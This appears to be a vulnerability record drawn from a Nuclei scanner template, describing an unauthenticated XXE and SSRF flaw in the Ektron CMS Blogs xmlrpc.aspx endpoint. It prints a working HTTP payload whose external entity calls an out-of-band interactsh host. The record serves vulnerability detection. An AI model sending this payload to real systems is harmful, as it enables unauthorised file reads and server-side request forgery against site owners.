# Vulnerability: Ektron CMS Blogs xmlrpc.aspx - XML External Entity Injection
**Classification:** CWE-611,CWE-918
**Source:** Nuclei Template (`ektron-blog-xmlrpc-xxe.yaml`)

## Description
Detects XML External Entity (XXE) vulnerability in Ektron CMS Blogs component (/WorkArea/Blogs/xmlrpc.aspx). Allows unauthenticated attackers to read local files or perform SSRF.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /WorkArea/Blogs/xmlrpc.aspx HTTP/1.1
Host: {{Hostname}}

<!DOCTYPE scan [<!ENTITY test SYSTEM "http://{{interactsh-url}}">]>
<scan>&test;</scan>
```

